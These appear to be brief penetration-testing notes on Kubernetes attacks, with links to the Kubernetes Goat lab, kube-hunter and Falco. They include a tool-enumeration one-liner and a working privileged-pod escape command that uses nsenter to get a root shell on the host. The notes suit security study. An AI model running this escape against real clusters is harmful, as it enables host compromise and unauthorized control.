Practice:
<https://github.com/madhuakula/kubernetes-goat>
<https://www.youtube.com/watch?v=YFCOvPVa5co>

Find tools:
```
echo "Useful tools:"; missing=""; for i in kubectl hostname perl python python3 dpkg bash sh yq jq nmap curl wget ping apt apk openssl nc netcat sed vim vi nano base64 tar; do command -v "$i" >/dev/null 2>&1 && echo "$i" || missing="$missing $i"; done; if [ -n "$missing" ]; then echo  "Missing tools: $(echo "$missing" | sort)"; fi
```

Tools:
<https://github.com/aquasecurity/kube-hunter>
<https://github.com/falcosecurity/falco> (cloud runtime security tool)

Pod/Container Escape via privileged pod:
```
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

<https://kubenomicon.com/Kubenomicon.html>
<https://youtu.be/JMTMEEqaBKg?t=4344>

Video walkthorugh of kubernetes basics and attacks.